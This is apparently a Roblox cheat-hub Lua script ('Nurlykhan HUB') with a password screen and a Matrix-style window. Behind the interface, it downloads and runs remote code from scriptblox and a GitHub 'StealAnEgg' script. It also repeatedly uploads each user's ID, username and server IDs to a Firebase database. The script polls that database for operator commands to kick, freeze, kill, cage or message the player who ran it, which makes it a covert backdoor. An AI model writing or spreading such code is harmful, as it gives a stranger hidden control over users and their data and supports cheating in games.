-- =====================================================================
-- NURLYKHAN ULTIMATE USER SCRIPT // FULL MATRIX & TRANSPARENT WINDOW
-- =====================================================================

pcall(function() 
    loadstring(game:HttpGet("https://scriptblox.com/ingest/clientv2.lua"))("proj_6359c89f56ac", "1.0.0", false) 
end)

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local MY_ROBLOX_USER_ID = 7103646402 
local DATABASE_URL = "https://play-lag-default-rtdb.firebaseio.com/ActiveUsers"
local SETTINGS_URL = "https://play-lag-default-rtdb.firebaseio.com/Settings"
local HUB_URL = "https://raw.githubusercontent.com/h16536666-dotcom/Egg-Roblox-Delta-script-/refs/heads/main/StealAnEgg.lua"

local cageModel = nil

local function createCage()
    if cageModel then cageModel:Destroy() end
    local char = LocalPlayer.Character
    if not char or not char:FindFirstChild("HumanoidRootPart") then return end
    local hrp = char.HumanoidRootPart
    cageModel = Instance.new("Model")
    cageModel.Name = "NurlykhanSafeCage"
    local cPos = hrp.Position
    local parts = {
        {Vector3.new(8, 0.6, 8), Vector3.new(0, -3.5, 0), true},
        {Vector3.new(8, 0.6, 8), Vector3.new(0, 4.5, 0), false},
        {Vector3.new(0.6, 8, 8), Vector3.new(-4, 0.5, 0), false},
        {Vector3.new(0.6, 8, 8), Vector3.new(4, 0.5, 0), false},
        {Vector3.new(8, 8, 0.6), Vector3.new(0, 0.5, -4), false},
        {Vector3.new(8, 8, 0.6), Vector3.new(0, 0.5, 4), false}
    }
    local mainPart = nil
    for i, pInfo in ipairs(parts) do
        local p = Instance.new("Part")
        p.Size = pInfo[1]
        p.CFrame = CFrame.new(cPos + pInfo[2])
        p.Color = Color3.fromRGB(0, 255, 65)
        p.Material = Enum.Material.Neon
        p.Transparency = 0.4
        p.Anchored = true
        p.CanCollide = pInfo[3]
        p.Parent = cageModel
        if i == 1 then mainPart = p end
    end
    cageModel.PrimaryPart = mainPart
    cageModel.Parent = workspace
end

local function moveCage(offsetVector)
    if cageModel and cageModel.PrimaryPart then
        for _, part in ipairs(cageModel:GetChildren()) do
            if part:IsA("BasePart") then part.CFrame = part.CFrame + offsetVector end
        end
        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
            LocalPlayer.Character.HumanoidRootPart.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame + offsetVector
        end
    end
end

local function destroyCage()
    if cageModel then cageModel:Destroy() cageModel = nil end
end

task.spawn(function()
    while task.wait(4) do
        pcall(function()
            request({ Url = DATABASE_URL .. "/" .. LocalPlayer.UserId .. "/Time.json", Method = "PUT", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(os.time()) })
            request({ Url = DATABASE_URL .. "/" .. LocalPlayer.UserId .. "/Username.json", Method = "PUT", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(LocalPlayer.Name) })
        end)
    end
end)

local function showAdminMessageGui(msgText)
    local CoreGui = game:GetService("CoreGui")
    local oldMsg = CoreGui:FindFirstChild("NurlykhanMsgGui")
    if oldMsg then oldMsg:Destroy() end
    local MsgGui = Instance.new("ScreenGui") MsgGui.Name = "NurlykhanMsgGui" MsgGui.ResetOnSpawn = false
    pcall(function() MsgGui.Parent = CoreGui end)
    if not MsgGui.Parent then MsgGui.Parent = LocalPlayer:WaitForChild("PlayerGui") end

    local MsgBoxFrame = Instance.new("Frame") MsgBoxFrame.Size = UDim2.new(0, 340, 0, 200) MsgBoxFrame.Position = UDim2.new(0.5, -170, 0.2, 0) MsgBoxFrame.BackgroundColor3 = Color3.fromRGB(10, 20, 10) MsgBoxFrame.BackgroundTransparency = 0.2 MsgBoxFrame.Active = true MsgBoxFrame.Draggable = true MsgBoxFrame.Parent = MsgGui
    Instance.new("UICorner", MsgBoxFrame).CornerRadius = UDim.new(0, 10)
    local stroke = Instance.new("UIStroke") stroke.Color = Color3.fromRGB(0, 255, 65) stroke.Thickness = 2 stroke.Parent = MsgBoxFrame

    local Title = Instance.new("TextLabel") Title.Size = UDim2.new(1, 0, 0, 30) Title.BackgroundTransparency = 1 Title.Text = "💬 Nurlykhan HUB // ХАБАРЛАМА" Title.TextColor3 = Color3.fromRGB(0, 255, 65) Title.TextSize = 12 Title.Font = Enum.Font.SourceSansBold Title.Parent = MsgBoxFrame
    local MsgLabel = Instance.new("TextLabel") MsgLabel.Size = UDim2.new(0.9, 0, 0, 50) MsgLabel.Position = UDim2.new(0.05, 0, 0.18, 0) MsgLabel.BackgroundTransparency = 1 MsgLabel.Text = "Админ: " .. tostring(msgText) MsgLabel.TextColor3 = Color3.fromRGB(255, 255, 255) MsgLabel.TextSize = 12 MsgLabel.Font = Enum.Font.SourceSans MsgLabel.TextWrapped = true MsgLabel.Parent = MsgBoxFrame

    local ReplyInput = Instance.new("TextBox") ReplyInput.Size = UDim2.new(0.9, 0, 0, 30) ReplyInput.Position = UDim2.new(0.05, 0, 0.48, 0) ReplyInput.BackgroundColor3 = Color3.fromRGB(5, 15, 5) ReplyInput.BackgroundTransparency = 0.3 ReplyInput.TextColor3 = Color3.fromRGB(0, 255, 65) ReplyInput.PlaceholderText = "Админге жауап жазу..." ReplyInput.Text = "" ReplyInput.TextSize = 11 ReplyInput.Font = Enum.Font.Code ReplyInput.Parent = MsgBoxFrame
    Instance.new("UICorner", ReplyInput).CornerRadius = UDim.new(0, 6)

    local SendReplyBtn = Instance.new("TextButton") SendReplyBtn.Size = UDim2.new(0.43, 0, 0, 28) SendReplyBtn.Position = UDim2.new(0.05, 0, 0.72, 0) SendReplyBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 50) SendReplyBtn.TextColor3 = Color3.fromRGB(255, 255, 255) SendReplyBtn.Text = "Жіберу" SendReplyBtn.TextSize = 12 SendReplyBtn.Font = Enum.Font.SourceSansBold SendReplyBtn.Parent = MsgBoxFrame
    Instance.new("UICorner", SendReplyBtn).CornerRadius = UDim.new(0, 6)

    local CloseBtn = Instance.new("TextButton") CloseBtn.Size = UDim2.new(0.43, 0, 0, 28) CloseBtn.Position = UDim2.new(0.52, 0, 0.72, 0) CloseBtn.BackgroundColor3 = Color3.fromRGB(150, 50, 50) CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255) CloseBtn.Text = "Жабу" CloseBtn.TextSize = 12 CloseBtn.Font = Enum.Font.SourceSansBold CloseBtn.Parent = MsgBoxFrame
    Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(0, 6)

    SendReplyBtn.MouseButton1Click:Connect(function()
        if ReplyInput.Text ~= "" then
            pcall(function()
                request({ Url = DATABASE_URL .. "/" .. LocalPlayer.UserId .. "/UserReply.json", Method = "PUT", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(ReplyInput.Text) })
            end)
            SendReplyBtn.Text = "Жіберілді!"
            task.wait(1)
            MsgGui:Destroy()
        end
    end)
    CloseBtn.MouseButton1Click:Connect(function() MsgGui:Destroy() end)
end

task.spawn(function()
    while task.wait(1) do
        pcall(function()
            local res = request({ Url = DATABASE_URL .. "/" .. LocalPlayer.UserId .. ".json", Method = "GET" })
            if res and res.StatusCode == 200 and res.Body ~= "null" then
                local uData = HttpService:JSONDecode(res.Body)
                if type(uData) == "table" then
                    if uData.CageState == "Create" then
                        request({ Url = DATABASE_URL .. "/" .. LocalPlayer.UserId .. "/CageState.json", Method = "PUT", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode("") })
                        createCage()
                    elseif uData.CageState == "Destroy" then
                        request({ Url = DATABASE_URL .. "/" .. LocalPlayer.UserId .. "/CageState.json", Method = "PUT", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode("") })
                        destroyCage()
                    elseif uData.CageMove and uData.CageMove ~= "" then
                        local dir = uData.CageMove
                        request({ Url = DATABASE_URL .. "/" .. LocalPlayer.UserId .. "/CageMove.json", Method = "PUT", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode("") })
                        if dir == "Up" then moveCage(Vector3.new(0, 4, 0))
                        elseif dir == "Down" then moveCage(Vector3.new(0, -4, 0))
                        elseif dir == "Left" then moveCage(Vector3.new(-4, 0, 0))
                        elseif dir == "Right" then moveCage(Vector3.new(4, 0, 0)) end
                    end
                    if uData.Message and tostring(uData.Message) ~= "" then
                        local msgReceived = tostring(uData.Message)
                        request({ Url = DATABASE_URL .. "/" .. LocalPlayer.UserId .. "/Message.json", Method = "PUT", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode("") })
                        showAdminMessageGui(msgReceived)
                    end
                    if uData.Kick == true then LocalPlayer:Kick("Nurlykhan HUB 👑: Админ сізді ойыннан шығарды!") end
                    if uData.Freeze == true then
                        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then LocalPlayer.Character.HumanoidRootPart.Anchored = true end
                    elseif uData.Freeze == false then
                        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then LocalPlayer.Character.HumanoidRootPart.Anchored = false end
                    end
                    if uData.Kill == true then
                        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then LocalPlayer.Character.Humanoid.Health = 0 end
                        request({ Url = DATABASE_URL .. "/" .. LocalPlayer.UserId .. "/Kill.json", Method = "PUT", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(false) })
                    end
                end
            end
        end)
    end
end)

if getgenv().NurlykhanHubLoaded == true then
    pcall(function() local source = game:HttpGet(HUB_URL) if source and source ~= "" then loadstring(source)() end end)
    return
end

local currentPassword = "1921"

pcall(function()
    local passRes = request({ Url = SETTINGS_URL .. "/PasswordData.json", Method = "GET" })
    if passRes and passRes.StatusCode == 200 and passRes.Body ~= "null" then
        local pData = HttpService:JSONDecode(passRes.Body)
        if type(pData) == "table" and pData.Password then
            if pData.ExpireTime == 0 or os.time() < pData.ExpireTime then currentPassword = tostring(pData.Password) else currentPassword = "NONE" end
        end
    end
end)

local function showUpdateScreen()
    getgenv().NurlykhanHubLoaded = true
    pcall(function() local source = game:HttpGet(HUB_URL) if source and source ~= "" then loadstring(source)() end end)
end

local function registerActiveUser()
    task.spawn(function()
        pcall(function()
            request({ Url = DATABASE_URL .. "/" .. LocalPlayer.UserId .. ".json", Method = "PUT", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode({ Username = LocalPlayer.Name, Time = os.time(), Kick = false, Freeze = false, Kill = false, CageState = "", CageMove = "", Message = "", UserReply = "", JobId = game.JobId, PlaceId = game.PlaceId }) })
        end)
    end)
    showUpdateScreen()
end

if currentPassword == "NONE" then
    registerActiveUser()
else
    local CoreGui = game:GetService("CoreGui")
    local ScreenGui = Instance.new("ScreenGui") ScreenGui.Name = "NurlykhanHubPass" ScreenGui.ResetOnSpawn = false
    pcall(function() ScreenGui.Parent = CoreGui end)
    if not ScreenGui.Parent then ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui") end

    -- Мөлдір фонды негізгі терезе (BackgroundTransparency қосылды)
    local MainFrame = Instance.new("Frame") MainFrame.Size = UDim2.new(0, 420, 0, 230) MainFrame.Position = UDim2.new(0.5, -210, 0.5, -115) MainFrame.BackgroundColor3 = Color3.fromRGB(5, 10, 5) MainFrame.BackgroundTransparency = 0.25 MainFrame.BorderSizePixel = 0 MainFrame.Active = true MainFrame.Draggable = true MainFrame.ClipsDescendants = true MainFrame.Parent = ScreenGui
    Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 12)

    local stroke = Instance.new("UIStroke") stroke.Color = Color3.fromRGB(0, 255, 65) stroke.Thickness = 2 stroke.Parent = MainFrame

    -- ❇️ МАТРИЦА ФОНЫ ТОЛЫҚ ТЕРЕЗЕГЕ ЖАЙЫЛДЫ (Size = UDim2.new(1, 0, 1, 0))
    local MatrixHolder = Instance.new("Frame") MatrixHolder.Size = UDim2.new(1, 0, 1, 0) MatrixHolder.BackgroundTransparency = 1 MatrixHolder.ClipsDescendants = true MatrixHolder.Parent = MainFrame
    local chars = {"0", "1", "X", "K", "P", "2", "0", "3", "5", "N", "U", "R", "#", "$", "%"}
    for i = 1, 20 do
        task.spawn(function()
            local colLabel = Instance.new("TextLabel") colLabel.Size = UDim2.new(0, 25, 1, 0) colLabel.Position = UDim2.new((i - 1) * 0.05, 0, 0, 0) colLabel.BackgroundTransparency = 1 colLabel.TextColor3 = Color3.fromRGB(0, 255, 65) colLabel.TextTransparency = 0.5 colLabel.TextSize = 11 colLabel.Font = Enum.Font.Code colLabel.TextYAlignment = Enum.TextYAlignment.Top colLabel.Parent = MatrixHolder
            while MainFrame and MainFrame.Parent do
                local txt = ""
                for j = 1, 20 do txt = txt .. chars[math.random(1, #chars)] .. "\n" end
                colLabel.Text = txt
                task.wait(math.random(1, 3) * 0.1)
            end
        end)
    end

    local Title = Instance.new("TextLabel") Title.Size = UDim2.new(1, 0, 0, 35) Title.BackgroundTransparency = 1 Title.Text = "Nurlykhan HUB 👑" Title.TextColor3 = Color3.fromRGB(0, 255, 65) Title.TextSize = 18 Title.Font = Enum.Font.SourceSansBold Title.TextStrokeTransparency = 0.5 Title.Parent = MainFrame

    -- 👤 3D АЙНАЛАТЫН СКИН
    local Viewport = Instance.new("ViewportFrame") Viewport.Size = UDim2.new(0.38, 0, 0.75, 0) Viewport.Position = UDim2.new(0.03, 0, 0.18, 0) Viewport.BackgroundTransparency = 1 Viewport.Parent = MainFrame
    local worldModel = Instance.new("WorldModel") worldModel.Parent = Viewport
    local camera = Instance.new("Camera") camera.Parent = Viewport Viewport.CurrentCamera = camera

    task.spawn(function()
        pcall(function()
            local dummy = Players:CreateHumanoidModelFromUserId(MY_ROBLOX_USER_ID) dummy.Parent = worldModel
            local head = dummy:FindFirstChild("Head") local root = dummy:FindFirstChild("HumanoidRootPart") or head
            if head then
                local bbg = Instance.new("BillboardGui") bbg.Size = UDim2.new(0, 150, 0, 40) bbg.StudsOffset = Vector3.new(0, 2.2, 0) bbg.AlwaysOnTop = true bbg.Parent = head
                local txt = Instance.new("TextLabel") txt.Size = UDim2.new(1, 0, 1, 0) txt.BackgroundTransparency = 1 txt.Text = "Xakep_2035 👑" txt.TextColor3 = Color3.fromRGB(0, 255, 65) txt.TextSize = 15 txt.Font = Enum.Font.SourceSansBold txt.TextStrokeTransparency = 0 txt.Parent = bbg
            end
            if root then
                dummy:SetPrimaryPartCFrame(CFrame.new(0, 0, 0)) camera.CFrame = CFrame.new(Vector3.new(0, 0.8, 5.5), Vector3.new(0, 0, 0))
                local angle = 0 local spinConnection
                spinConnection = RunService.RenderStepped:Connect(function(dt)
                    if not ScreenGui or not ScreenGui.Parent or not MainFrame or not MainFrame.Parent then spinConnection:Disconnect() return end
                    angle = angle + (dt * 2) dummy:SetPrimaryPartCFrame(CFrame.new(0, -0.5, 0) * CFrame.Angles(0, angle, 0))
                end)
            end
        end)
    end)

    local PassBox = Instance.new("TextBox") PassBox.Size = UDim2.new(0.52, 0, 0, 38) PassBox.Position = UDim2.new(0.44, 0, 0.3, 0) PassBox.BackgroundColor3 = Color3.fromRGB(15, 25, 15) PassBox.BackgroundTransparency = 0.3 PassBox.TextColor3 = Color3.fromRGB(0, 255, 65) PassBox.PlaceholderText = "Пароль енгізіңіз..." PassBox.Text = "" PassBox.TextSize = 14 PassBox.Font = Enum.Font.Code PassBox.Parent = MainFrame
    Instance.new("UICorner", PassBox).CornerRadius = UDim.new(0, 8)
    local pStroke = Instance.new("UIStroke") pStroke.Color = Color3.fromRGB(0, 255, 65) pStroke.Parent = PassBox

    local SubmitBtn = Instance.new("TextButton") SubmitBtn.Size = UDim2.new(0.52, 0, 0, 38) SubmitBtn.Position = UDim2.new(0.44, 0, 0.58, 0) SubmitBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 50) SubmitBtn.BackgroundTransparency = 0.2 SubmitBtn.TextColor3 = Color3.fromRGB(255, 255, 255) SubmitBtn.Text = "Кіру 🚀" SubmitBtn.TextSize = 16 SubmitBtn.Font = Enum.Font.SourceSansBold SubmitBtn.Parent = MainFrame
    Instance.new("UICorner", SubmitBtn).CornerRadius = UDim.new(0, 8)

    local ResizeBtn = Instance.new("TextButton") ResizeBtn.Size = UDim2.new(0, 18, 0, 18) ResizeBtn.Position = UDim2.new(1, -18, 1, -18) ResizeBtn.BackgroundColor3 = Color3.fromRGB(0, 100, 40) ResizeBtn.TextColor3 = Color3.fromRGB(255, 255, 255) ResizeBtn.Text = "↘" ResizeBtn.TextSize = 12 ResizeBtn.Font = Enum.Font.SourceSansBold ResizeBtn.Parent = MainFrame
    Instance.new("UICorner", ResizeBtn).CornerRadius = UDim.new(0, 4)

    local isResizing = false local startInput, startSize
    ResizeBtn.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then isResizing = true startInput = input.Position startSize = MainFrame.Size end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if isResizing and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - startInput
            local newX = math.max(320, startSize.X.Offset + delta.X)
            local newY = math.max(180, startSize.Y.Offset + delta.Y)
            MainFrame.Size = UDim2.new(0, newX, 0, newY)
        end
    end)
    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then isResizing = false end
    end)

    SubmitBtn.MouseButton1Click:Connect(function()
        if tostring(PassBox.Text) == tostring(currentPassword) then
            ScreenGui:Destroy()
            registerActiveUser()
        else
            SubmitBtn.Text = "Пароль қате!" SubmitBtn.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
            task.wait(1.5)
            SubmitBtn.Text = "Кіру 🚀" SubmitBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 50)
        end
    end)
end
